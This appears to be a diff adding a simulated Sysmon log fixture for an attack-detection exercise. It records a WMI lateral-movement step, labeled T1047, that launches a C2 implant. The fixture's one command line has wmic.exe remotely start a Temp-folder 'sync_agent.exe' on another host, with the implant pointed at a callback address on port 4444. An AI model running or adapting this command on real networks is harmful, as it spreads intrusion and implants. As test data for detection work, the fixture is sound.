@@ -1,0 +1,42 @@
+[
+  {
+    "@timestamp": "2026-03-22T09:14:32.441Z",
+    "event": {
+      "category": "process",
+      "type": "start",
+      "action": "Process Create (rule: ProcessCreate)",
+      "code": "1"
+    },
+    "process": {
+      "pid": 5832,
+      "name": "wmic.exe",
+      "executable": "C:\\Windows\\System32\\wbem\\wmic.exe",
+      "command_line": "wmic.exe /node:192.168.10.45 process call create \"C:\\Users\\clee\\AppData\\Local\\Temp\\sync_agent.exe -s 192.168.10.200 -p 4444\"",
+      "parent": {
+        "pid": 7104,
+        "name": "sync_agent.exe",
+        "executable": "C:\\Users\\clee\\AppData\\Local\\Temp\\sync_agent.exe"
+      }
+    },
+    "user": {
+      "name": "clee",
+      "domain": "CORP"
+    },
+    "host": {
+      "name": "WS-FINANCE-01",
+      "os": {
+        "platform": "windows"
+      }
+    },
+    "agent": {
+      "type": "sysmon"
+    },
+    "_simulation": {
+      "type": "attack",
+      "technique": "T1047",
+      "sequence_order": 1,
+      "sequence_total": 3,
+      "description": "Fawkes wmi command \u00e2\u20ac\u201d wmic.exe used to remotely create a process on a lateral target, spawned from the C2 implant"
+    }
+  }
+]
